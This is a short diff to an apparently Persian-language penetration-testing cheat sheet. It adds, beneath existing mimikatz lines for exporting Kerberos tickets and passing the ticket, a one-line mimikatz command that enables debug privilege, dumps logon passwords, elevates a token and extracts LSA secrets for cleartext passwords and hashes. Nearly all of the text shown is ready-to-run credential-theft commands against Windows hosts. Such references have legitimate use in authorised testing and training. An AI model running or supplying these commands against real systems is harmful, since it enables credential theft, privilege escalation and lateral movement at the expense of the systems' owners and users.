@@ -747,6 +747,12 @@ if I ip.src == 'ip' ) (
 mimikatz# sekurlsa::tickets /export
 mimikatz# kerberos::ptt <TICKET PATH>
 ```
+یا
+
+```text
+#cleartext password and hash
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::secrets" "exit"
+```
 
 ### دستور Hping3
 
